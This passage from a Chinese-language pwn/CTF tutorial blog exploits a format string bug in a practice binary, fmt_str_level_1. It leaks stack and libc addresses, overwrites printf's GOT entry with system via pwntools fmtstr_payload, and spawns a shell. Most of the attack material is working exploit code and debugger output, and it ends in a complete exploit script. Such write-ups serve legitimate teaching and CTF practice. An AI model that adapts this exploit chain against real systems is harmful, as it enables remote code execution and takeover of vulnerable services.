punctuation">;</span>    <span class="token function">setvbuf</span><span class="token punctuation">(</span><span class="token constant">stderr</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">2</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">int</span> <span class="token function">dofunc</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token keyword">char</span> buf<span class="token punctuation">[</span><span class="token number">0x100</span><span class="token punctuation">]</span> <span class="token punctuation">;</span>    <span class="token keyword">while</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"input:"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token function">read</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span>buf<span class="token punctuation">,</span><span class="token number">0x100</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">strncmp</span><span class="token punctuation">(</span>buf<span class="token punctuation">,</span><span class="token string">"quit"</span><span class="token punctuation">,</span><span class="token number">4</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token keyword">break</span><span class="token punctuation">;</span>        <span class="token function">printf</span><span class="token punctuation">(</span>buf<span class="token punctuation">)</span><span class="token punctuation">;</span>          <span class="token punctuation">&#125;</span>    <span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">int</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token function">init_func</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">dofunc</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token comment">//gcc fmt_str_level_1.c -z lazy -o fmt_str_level_1_x64</span><span class="token comment">//gcc -m32 fmt_str_level_1.c -z lazy -o fmt_str_level_1_x86</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>还是老规矩，先熟悉一下 IDA：（虽然给了源代码hhh）</p><p><img src="https://blog-markdown-1317553172.cos.ap-nanjing.myqcloud.com/%E4%BD%A0%E6%83%B3%E6%9C%89%E5%A4%9APWN-fmt_test2_1.png" alt="你想有多PWN-fmt_test2_1.png"></p><p><img src="https://blog-markdown-1317553172.cos.ap-nanjing.myqcloud.com/%E4%BD%A0%E6%83%B3%E6%9C%89%E5%A4%9APWN-fmt_test2_2.png" alt="你想有多PWN-fmt_test2_2.png"></p><p><img src="https://blog-markdown-1317553172.cos.ap-nanjing.myqcloud.com/%E4%BD%A0%E6%83%B3%E6%9C%89%E5%A4%9APWN-fmt_test2_3.png" alt="你想有多PWN-fmt_test2_3.png"></p><p>明显在 <code>printf(buf)</code> 处存在格式化字符串漏洞</p><p>看一眼保护，32 位小端序，RELRO 开了一半，其余全开：</p><p><img src="https://blog-markdown-1317553172.cos.ap-nanjing.myqcloud.com/%E4%BD%A0%E6%83%B3%E6%9C%89%E5%A4%9APWN-fmt_test2_4.png" alt="你想有多PWN-fmt_test2_4.png"></p><blockquote><p>由于这里有个 while 循环一直调用 printf 函数，且 RELRO 为 Partial RELRO，因此可以考虑将 <code>printf()</code> 的 GOT 表地址修改为 <code>system_plt</code>，然后调用 <code>printf()</code> 输出 <code>b&#39;/bin/sh&#39;</code> 即可实现 <code>system(&quot;/bin/sh&quot;)</code></p></blockquote><p>但是由于程序开启了 PIE 地址随机化，因此 <code>printf()</code> 的 GOT 表地址未知，也不知道其他任何函数的真实地址</p><p>所以首先思路就是通过格式化字符串漏洞来泄露一些地址</p><hr><h2 id="定位并泄露栈中的数据"><a href="#定位并泄露栈中的数据" class="headerlink" title="定位并泄露栈中的数据"></a>定位并泄露栈中的数据</h2><p>首先 gdb 调试 <code>fmt_str_level_1_x86</code> 程序：</p><p><img src="https://blog-markdown-1317553172.cos.ap-nanjing.myqcloud.com/%E4%BD%A0%E6%83%B3%E6%9C%89%E5%A4%9APWN-fmt_test2_5.png" alt="你想有多PWN-fmt_test2_5.png"></p><p>执行到 <code>read()</code> 输入的地方，输入：</p><pre class="line-numbers language-c" data-language="c"><code class="language-c">aaaa_<span class="token operator">%</span>p_<span class="token operator">%</span>p_<span class="token operator">%</span>p_<span class="token operator">%</span>p_<span class="token operator">%</span>p_<span class="token operator">%</span>p_<span class="token operator">%</span>p_<span class="token operator">%</span>p_<span class="token operator">%</span>p_<span class="token operator">%</span>p_<span class="token operator">%</span>p_<span class="token operator">%</span>p<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="https://blog-markdown-1317553172.cos.ap-nanjing.myqcloud.com/%E4%BD%A0%E6%83%B3%E6%9C%89%E5%A4%9APWN-fmt_test2_6.png" alt="你想有多PWN-fmt_test2_6.png"></p><p>执行到 <code>printf()</code> 处观察输出结果：</p><p><img src="https://blog-markdown-1317553172.cos.ap-nanjing.myqcloud.com/%E4%BD%A0%E6%83%B3%E6%9C%89%E5%A4%9APWN-fmt_test2_7.png" alt="你想有多PWN-fmt_test2_7.png"></p><pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token function">aaaa_0x5655700f_0x4_0x565562e5_0xf7ffd000_0x20_</span><span class="token punctuation">(</span>nil<span class="token punctuation">)</span>_0x61616161_0x5f70255f_0x255f7025_0x70255f70_0x5f70255f_0x255f7025���T���<span class="token number">4</span>���������tV��\�������<span class="token number">0x5655634f</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>可以看到 <code>0x61616161</code> 就是刚刚输入的 <code>aaaa</code>，位于第 7 个位置</p><p>可以通过查看栈来验证一下：</p><p><img src="https://blog-markdown-1317553172.cos.ap-nanjing.myqcloud.com/%E4%BD%A0%E6%83%B3%E6%9C%89%E5%A4%9APWN-fmt_test2_8.png" alt="你想有多PWN-fmt_test2_8.png"></p><blockquote><p>由于需要泄露真实地址，这里选择泄露栈上的返回地址（<strong>通常选择返回地址，不会受栈中的数据影响</strong>）</p></blockquote><p>找到 EBP 所在位置，由于栈空间比较长，这里使用：</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token punctuation">(</span>gdb<span class="token punctuation">)</span> stack <span class="token number">100</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="https://blog-markdown-1317553172.cos.ap-nanjing.myqcloud.com/%E4%BD%A0%E6%83%B3%E6%9C%89%E5%A4%9APWN-fmt_test2_9.png" alt="你想有多PWN-fmt_test2_9.png"></p><p>可以看到 EBP 位于 <code>0xffffcdb8</code> 地址处，栈的返回地址紧随其后位于 <code>0xffffcdbc</code> 地址处，得知返回地址 <code>main+30</code> 的地址为：<code>0x5655638e</code></p><blockquote><p>注意：由于程序开启了 PIE，这里看到的 <code>main+30</code> 的地址其实是随机的，不过，不论地址怎么变，栈的结构是不会变的（<em>虽然地址是随机的，但由于操作系统的分页管理机制，地址的最低三位通常是不变的</em>）</p><p>因此，可以通过计算 <code>main+30</code> 在栈中的位置，然后利用格式化字符串漏洞将其泄露出来</p></blockquote><p>刚刚得知输入的 <code>aaaa</code> 位于栈中的第 7 个位置，存放在地址 <code>0xffffccac</code> 处</p><p>计算可知 <code>main+30</code> 所在位置与 <code>aaaa</code> 相距：<code>(0xffffcdbc - 0xffffccac) / 4 = 68</code></p><p>所以 <code>main+30</code> 在栈中位于第 <code>68 + 7 = 75</code> 个位置，构造 <code>printf(%75$p)</code> 即可将其泄露</p><p>验证一下：</p><p><img src="https://blog-markdown-1317553172.cos.ap-nanjing.myqcloud.com/%E4%BD%A0%E6%83%B3%E6%9C%89%E5%A4%9APWN-fmt_test2_10.png" alt="你想有多PWN-fmt_test2_10.png"></p><p><img src="https://blog-markdown-1317553172.cos.ap-nanjing.myqcloud.com/%E4%BD%A0%E6%83%B3%E6%9C%89%E5%A4%9APWN-fmt_test2_11.png" alt="你想有多PWN-fmt_test2_11.png"></p><p>泄露出来的地址与 <code>main+30</code> 的地址 <code>0x5655638e</code> 一致</p><p>于是，将 <code>printf(%75$p)</code> 泄露出来的地址减去 30 就可以得到真实的 main 函数地址了：</p><pre class="line-numbers language-python" data-language="python"><code class="language-python">io<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">b'input:\n'</span><span class="token punctuation">)</span>payload <span class="token operator">=</span> <span class="token string">b'%75$p'</span>io<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>payload<span class="token punctuation">)</span>ret_main_addr <span class="token operator">=</span> <span class="token builtin">int</span><span class="token punctuation">(</span>io<span class="token punctuation">.</span>recv<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">:</span><span class="token number">10</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token number">16</span><span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"ret_main_addr -->"</span><span class="token punctuation">,</span> <span class="token builtin">hex</span><span class="token punctuation">(</span>ret_main_addr<span class="token punctuation">)</span><span class="token punctuation">)</span>main_addr <span class="token operator">=</span> ret_main_addr <span class="token operator">-</span> <span class="token number">30</span><span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"main_addr -->"</span><span class="token punctuation">,</span> <span class="token builtin">hex</span><span class="token punctuation">(</span>main_addr<span class="token punctuation">)</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="利用-ELF-的函数偏移计算真实地址"><a href="#利用-ELF-的函数偏移计算真实地址" class="headerlink" title="利用 ELF 的函数偏移计算真实地址"></a>利用 ELF 的函数偏移计算真实地址</h2><blockquote><p>由于 ELF 文件中函数之间的偏移不变，所以 <code>elf.symbols[&quot;main&quot;] - elf.got[&quot;puts&quot;]</code> 应该与真实的 <code>main_addr - puts_got_addr</code> 相同</p><p>而真实的 <code>main_addr</code> 已经通过前面的泄露和计算得知了，因此可以计算出 <code>puts_got_addr</code></p></blockquote><pre class="line-numbers language-python" data-language="python"><code class="language-python">elf <span class="token operator">=</span> ELF<span class="token punctuation">(</span><span class="token string">"./fmt_str_level_1_x86"</span><span class="token punctuation">)</span>main_puts_offset <span class="token operator">=</span> elf<span class="token punctuation">.</span>symbols<span class="token punctuation">[</span><span class="token string">"main"</span><span class="token punctuation">]</span> <span class="token operator">-</span> elf<span class="token punctuation">.</span>got<span class="token punctuation">[</span><span class="token string">"puts"</span><span class="token punctuation">]</span>puts_got_addr <span class="token operator">=</span> main_addr <span class="token operator">-</span> main_puts_offset<span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"puts_got_addr -->"</span><span class="token punctuation">,</span> <span class="token builtin">hex</span><span class="token punctuation">(</span>puts_got_addr<span class="token punctuation">)</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><p>由于我们要使用 <code>fmtstr_payload()</code> 将 <code>printf()</code> 的 GOT 表地址修改为 <code>system_plt</code>，因此还需要得到 <code>printf_got_addr</code></p><p>计算方法与 <code>puts_got_addr</code> 一样，利用 ELF 的函数偏移计算即可：</p><pre class="line-numbers language-python" data-language="python"><code class="language-python">main_printf_offset <span class="token operator">=</span> elf<span class="token punctuation">.</span>symbols<span class="token punctuation">[</span><span class="token string">"main"</span><span class="token punctuation">]</span> <span class="token operator">-</span> elf<span class="token punctuation">.</span>got<span class="token punctuation">[</span><span class="token string">"printf"</span><span class="token punctuation">]</span>printf_got_addr <span class="token operator">=</span> main_addr <span class="token operator">-</span> main_printf_offset<span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"printf_got_addr -->"</span><span class="token punctuation">,</span> <span class="token builtin">hex</span><span class="token punctuation">(</span>printf_got_addr<span class="token punctuation">)</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><h2 id="利用-libc-偏移计算-system-地址"><a href="#利用-libc-偏移计算-system-地址" class="headerlink" title="利用 libc 偏移计算 system 地址"></a>利用 libc 偏移计算 system 地址</h2><p>接下来还需要知道 <code>system()</code> 的真实地址，但是程序中并没有使用 <code>system()</code>，因此只能通过 libc 偏移来计算，这样就需要知道 <code>puts()</code> 或者 <code>printf()</code> 其一的真实地址（这些函数的实现来自于 libc，程序只负责调用）</p><p>以 <code>puts()</code> 为例：</p><p>由于我们已经得到了 <code>puts_got_addr</code>，该 GOT 表地址上存放的就是真实的 <code>puts_addr</code>，因此只需要将 <code>puts_got_addr</code> 这个地址上的值泄露出来即可</p><p>通过前面的分析已经知道，我们输入的内容在第 7 个位置，于是构造：</p><pre class="line-numbers language-python" data-language="python"><code class="language-python">payload <span class="token operator">=</span> p32<span class="token punctuation">(</span>puts_got_addr<span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token string">b'%7$s'</span>io<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>payload<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p><img src="https://blog-markdown-1317553172.cos.ap-nanjing.myqcloud.com/%E4%BD%A0%E6%83%B3%E6%9C%89%E5%A4%9APWN-fmt_test2_12.png" alt="你想有多PWN-fmt_test2_12.png"></p><p>接收的数据中，前面的 4 字节 <code>18 50 93 61</code> 即是 <code>p32(puts_got_addr)</code> 的地址（小端序），紧随其后的 4 字节就是 <code>b&#39;%7$s&#39;</code> 泄露出的 <code>puts_addr</code>（小端序）</p><pre class="line-numbers language-python" data-language="python"><code class="language-python">io<span class="token punctuation">.</span>recv<span class="token punctuation">(</span><span class="token number">4</span><span class="token punctuation">)</span>puts_addr <span class="token operator">=</span> u32<span class="token punctuation">(</span>io<span class="token punctuation">.</span>recv<span class="token punctuation">(</span><span class="token number">4</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"puts_addr -->"</span><span class="token punctuation">,</span> <span class="token builtin">hex</span><span class="token punctuation">(</span>puts_addr<span class="token punctuation">)</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p>然后，利用真实地址 <code>puts_addr</code> 计算 libc 偏移，得到 <code>system()</code> 的真实地址</p><h3 id="在本地不使用-LibcSearcher-的方法"><a href="#在本地不使用-LibcSearcher-的方法" class="headerlink" title="在本地不使用 LibcSearcher 的方法"></a>在本地不使用 LibcSearcher 的方法</h3><p>首先使用 ldd 确定程序的 libc 版本：</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">ldd fmt_str_level_1_x86<span class="token comment"># 输出为：</span><span class="token comment">#   linux-gate.so.1 (0xed54e000)</span><span class="token comment"># libc.so.6 => /lib/i386-linux-gnu/libc.so.6 (0xed200000)</span><span class="token comment"># /lib/ld-linux.so.2 (0xed550000)</span><span class="token comment"># 因此 libc 为 /lib/i386-linux-gnu/libc.so.6</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>利用偏移计算：</p><pre class="line-numbers language-python" data-language="python"><code class="language-python">libc <span class="token operator">=</span> ELF<span class="token punctuation">(</span><span class="token string">'/lib/i386-linux-gnu/libc.so.6'</span><span class="token punctuation">)</span>libcbase <span class="token operator">=</span> puts_addr <span class="token operator">-</span> libc<span class="token punctuation">.</span>symbols<span class="token punctuation">[</span><span class="token string">"puts"</span><span class="token punctuation">]</span>system_addr <span class="token operator">=</span> libcbase <span class="token operator">+</span> libc<span class="token punctuation">.</span>symbols<span class="token punctuation">[</span><span class="token string">"system"</span><span class="token punctuation">]</span>bin_sh_addr <span class="token operator">=</span> libcbase <span class="token operator">+</span> <span class="token builtin">next</span><span class="token punctuation">(</span>libc<span class="token punctuation">.</span>search<span class="token punctuation">(</span><span class="token string">b'/bin/sh'</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><blockquote><p>每计算一步获取到的值，都记得调试一下进行验证，看看结果是不是正确的</p></blockquote><p>可以看到 <code>system()</code> 地址没有问题：</p><p><img src="https://blog-markdown-1317553172.cos.ap-nanjing.myqcloud.com/%E4%BD%A0%E6%83%B3%E6%9C%89%E5%A4%9APWN-fmt_test2_13.png" alt="你想有多PWN-fmt_test2_13.png"></p><p><img src="https://blog-markdown-1317553172.cos.ap-nanjing.myqcloud.com/%E4%BD%A0%E6%83%B3%E6%9C%89%E5%A4%9APWN-fmt_test2_14.png" alt="你想有多PWN-fmt_test2_14.png"></p><h3 id="利用-glibc-all-in-one-的方法"><a href="#利用-glibc-all-in-one-的方法" class="headerlink" title="利用 glibc-all-in-one 的方法"></a>利用 glibc-all-in-one 的方法</h3><blockquote><p>由于我直接使用 LibcSearcher 找到的 libc 偏移计算出来的 <code>system()</code> 地址都不对：</p><pre class="line-numbers language-python" data-language="python"><code class="language-python">obj <span class="token operator">=</span> LibcSearcher<span class="token punctuation">(</span><span class="token string">"puts"</span><span class="token punctuation">,</span> puts_addr<span class="token punctuation">)</span><span class="token comment"># obj = LibcSearcher("__GI__IO_puts", puts_addr)</span>libcbase <span class="token operator">=</span> puts_addr <span class="token operator">-</span> obj<span class="token punctuation">.</span>dump<span class="token punctuation">(</span><span class="token string">'puts'</span><span class="token punctuation">)</span> <span class="token comment"># 计算偏移量</span><span class="token comment"># libcbase = puts_addr - obj.dump('__GI__IO_puts') # 计算偏移量</span>system_addr <span class="token operator">=</span> libcbase <span class="token operator">+</span> obj<span class="token punctuation">.</span>dump<span class="token punctuation">(</span><span class="token string">'system'</span><span class="token punctuation">)</span> <span class="token comment"># 计算程序中 system() 的真实地址  </span>bin_sh_addr <span class="token operator">=</span> libcbase <span class="token operator">+</span> obj<span class="token punctuation">.</span>dump<span class="token punctuation">(</span><span class="token string">'str_bin_sh'</span><span class="token punctuation">)</span> <span class="token comment"># 计算程序中'/bin/sh'的真实地址</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>所以这里通过在线网站查找：<a href="https://libc.blukat.me/">libc database search</a></p></blockquote><p>为了更精确的查找，多加几个限制条件</p><p>刚刚通过调试我们知道：<code>puts()</code> 的最低三位为 <code>0x2a0</code>，<code>system()</code> 最低三位为 <code>0x170</code></p><p><img src="https://blog-markdown-1317553172.cos.ap-nanjing.myqcloud.com/%E4%BD%A0%E6%83%B3%E6%9C%89%E5%A4%9APWN-fmt_test2_16.png" alt="你想有多PWN-fmt_test2_16.png"></p><p>然后 <code>b&#39;/bin/sh&#39;</code> 最低三位为 <code>0x0d5</code></p><p><strong>即使地址是随机的，但是最低三位是不变的</strong>，因此搜索一下：</p><p><img src="https://blog-markdown-1317553172.cos.ap-nanjing.myqcloud.com/%E4%BD%A0%E6%83%B3%E6%9C%89%E5%A4%9APWN-fmt_test2_17.png" alt="你想有多PWN-fmt_test2_17.png"></p><p>有三个 libc 满足条件，我这里选择 <code>libc6_2.35-0ubuntu3.7_i386</code></p><p>然后使用 glibc-all-in-one 下载对应版本的 libc：</p><p><img src="https://blog-markdown-1317553172.cos.ap-nanjing.myqcloud.com/%E4%BD%A0%E6%83%B3%E6%9C%89%E5%A4%9APWN-fmt_test2_18.png" alt="你想有多PWN-fmt_test2_18.png"></p><p>然后将 libc 路径更改为：</p><pre class="line-numbers language-python" data-language="python"><code class="language-python">libc <span class="token operator">=</span> ELF<span class="token punctuation">(</span><span class="token string">'/opt/glibc-all-in-one/libs/2.35-0ubuntu3.7_i386/libc.so.6'</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><blockquote><p><em>关于如何使用 glibc-all-in-one 详见《Pwntools与exp技巧》一文</em></p></blockquote><h2 id="使用-fmtstr-payload-修改-GOT-表"><a href="#使用-fmtstr-payload-修改-GOT-表" class="headerlink" title="使用 fmtstr_payload 修改 GOT 表"></a>使用 fmtstr_payload 修改 GOT 表</h2><p>最后，利用 <code>fmtstr_payload()</code> 构造格式化字符串利用，将 <code>printf_got_addr</code> 修改为 <code>system_plt</code> 地址即可</p><p>根据输入的数据位于第 7 个位置：</p><pre class="line-numbers language-python" data-language="python"><code class="language-python">payload_write_printf_got <span class="token operator">=</span> fmtstr_payload<span class="token punctuation">(</span><span class="token number">7</span><span class="token punctuation">,</span> <span class="token punctuation">&#123;</span>printf_got_addr<span class="token punctuation">:</span> system_addr<span class="token punctuation">&#125;</span><span class="token punctuation">)</span>io<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>payload_write_printf_got<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>向 <code>printf()</code> 传递参数 <code>b&#39;/bin/sh&#39;</code> 即可构造 <code>system(&quot;/bin/sh&quot;)</code></p><pre class="line-numbers language-python" data-language="python"><code class="language-python">io<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span><span class="token string">b'/bin/sh'</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h2 id="完整脚本"><a href="#完整脚本" class="headerlink" title="完整脚本"></a>完整脚本</h2><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">from</span> pwn <span class="token keyword">import</span> <span class="token operator">*</span><span class="token comment"># 设置系统架构, 打印调试信息</span>context<span class="token punctuation">(</span>os<span class="token operator">=</span><span class="token string">'linux'</span><span class="token punctuation">,</span> arch<span class="token operator">=</span><span class="token string">'i386'</span><span class="token punctuation">,</span> log_level<span class="token operator">=</span><span class="token string">'debug'</span><span class="token punctuation">)</span><span class="token comment"># PWN 远程 : content = 0, PWN 本地 : content = 1</span>content <span class="token operator">=</span> <span class="token number">1</span><span class="token keyword">if</span> content <span class="token operator">==</span> <span class="token number">1</span><span class="token punctuation">:</span><span class="token comment"># 将本地的 Linux 程序启动为进程 io</span>    io <span class="token operator">=</span> process<span class="token punctuation">(</span><span class="token string">"./fmt_str_level_1_x86"</span><span class="token punctuation">)</span><span class="token comment"># 附加 gdb 调试</span><span class="token keyword">def</span> <span class="token function">debug</span><span class="token punctuation">(</span>cmd<span class="token operator">=</span><span class="token string">""</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    gdb<span class="token punctuation">.</span>attach<span class="token punctuation">(</span>io<span class="token punctuation">,</span> cmd<span class="token punctuation">)</span>    pause<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token comment"># 泄露并计算 main 函数真实地址</span>io<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">b'input:\n'</span><span class="token punctuation">)</span>payload <span class="token operator">=</span> <span class="token string">b'%75$p'</span>io<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>payload<span class="token punctuation">)</span>ret_main_addr <span class="token operator">=</span> <span class="token builtin">int</span><span class="token punctuation">(</span>io<span class="token punctuation">.</span>recv<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">:</span><span class="token number">10</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token number">16</span><span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"ret_main_addr -->"</span><span class="token punctuation">,</span> <span class="token builtin">hex</span><span class="token punctuation">(</span>ret_main_addr<span class="token punctuation">)</span><span class="token punctuation">)</span>main_addr <span class="token operator">=</span> ret_main_addr <span class="token operator">-</span> <span class="token number">30</span><span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"main_addr -->"</span><span class="token punctuation">,</span> <span class="token builtin">hex</span><span class="token punctuation">(</span>main_addr<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token comment"># 根据 main 函数的真实地址计算 puts 函数的 GOT 表地址</span>elf <span class="token operator">=</span> ELF<span class="token punctuation">(</span><span class="token string">"./fmt_str_level_1_x86"</span><span class="token punctuation">)</span>main_puts_offset <span class="token operator">=</span> elf<span class="token punctuation">.</span>symbols<span class="token punctuation">[</span><span class="token string">"main"</span><span class="token punctuation">]</span> <span class="token operator">-</span> elf<span class="token punctuation">.</span>got<span class="token punctuation">[</span><span class="token string">"puts"</span><span class="token punctuation">]</span>puts_got_addr <span class="token operator">=</span> main_addr <span class="token operator">-</span> main_puts_offset<span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"puts_got_addr -->"</span><span class="token punctuation">,</span> <span class="token builtin">hex</span><span class="token punctuation">(</span>puts_got_addr<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token comment"># 利用 puts 函数的 GOT 表地址泄露 puts 函数的真实地址</span>payload <span class="token operator">=</span> p32<span class="token punctuation">(</span>puts_got_addr<span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token string">b'%7$s'</span>io<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>payload<span class="token punctuation">)</span>io<span class="token punctuation">.</span>recv<span class="token punctuation">(</span><span class="token number">4</span><span class="token punctuation">)</span>puts_addr <span class="token operator">=</span> u32<span class="token punctuation">(</span>io<span class="token punctuation">.</span>recv<span class="token punctuation">(</span><span class="token number">4</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"puts_addr -->"</span><span class="token punctuation">,</span> <span class="token builtin">hex</span><span class="token punctuation">(</span>puts_addr<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token comment"># 根据 puts 函数的真实地址与 libc 偏移计算 system 函数地址</span>libc <span class="token operator">=</span> ELF<span class="token punctuation">(</span><span class="token string">'/lib/i386-linux-gnu/libc.so.6'</span><span class="token punctuation">)</span><span class="token comment"># libc = ELF('/opt/glibc-all-in-one/libs/2.35-0ubuntu3.7_i386/libc.so.6')</span>libcbase <span class="token operator">=</span> puts_addr <span class="token operator">-</span> libc<span class="token punctuation">.</span>symbols<span class="token punctuation">[</span><span class="token string">"puts"</span><span class="token punctuation">]</span>system_addr <span class="token operator">=</span> libcbase <span class="token operator">+</span> libc<span class="token punctuation">.</span>symbols<span class="token punctuation">[</span><span class="token string">"system"</span><span class="token punctuation">]</span>bin_sh_addr <span class="token operator">=</span> libcbase <span class="token operator">+</span> <span class="token builtin">next</span><span class="token punctuation">(</span>libc<span class="token punctuation">.</span>search<span class="token punctuation">(</span><span class="token string">b'/bin/sh'</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"libcbase -->"</span><span class="token punctuation">,</span> <span class="token builtin">hex</span><span class="token punctuation">(</span>libcbase<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"system_addr -->"</span><span class="token punctuation">,</span> <span class="token builtin">hex</span><span class="token punctuation">(</span>system_addr<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"bin_sh_addr -->"</span><span class="token punctuation">,</span> <span class="token builtin">hex</span><span class="token punctuation">(</span>bin_sh_addr<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token comment"># 根据 main 函数的真实地址计算 printf 函数的 GOT 表地址</span>main_printf_offset <span class="token operator">=</span> elf<span class="token punctuation">.</span>symbols<span class="token punctuation">[</span><span class="token string">"main"</span><span class="token punctuation">]</span> <span class="token operator">-</span> elf<span class="token punctuation">.</span>got<span class="token punctuation">[</span><span class="token string">"printf"</span><span class="token punctuation">]</span>printf_got_addr <span class="token operator">=</span> main_addr <span class="token operator">-</span> main_printf_offset<span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"printf_got_addr -->"</span><span class="token punctuation">,</span> <span class="token builtin">hex</span><span class="token punctuation">(</span>printf_got_addr<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token comment"># 利用 fmtstr_payload 将 printf 函数的 GOT 表地址改为 system 函数</span>payload_write_printf_got <span class="token operator">=</span> fmtstr_payload<span class="token punctuation">(</span><span class="token number">7</span><span class="token punctuation">,</span> <span class="token punctuation">&#123;</span>printf_got_addr<span class="token punctuation">:</span> system_addr<span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token comment"># debug()</span>io<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>payload_write_printf_got<span class="token punctuation">)</span><span class="token comment"># 向 printf 发送 b'/bin/sh' 构造 system("/bin/sh")</span>io<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span><span class="token string">b'/bin/sh'</span><span class="token punctuation">)</span><span class="token comment"># 与远程交互</span>io<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" 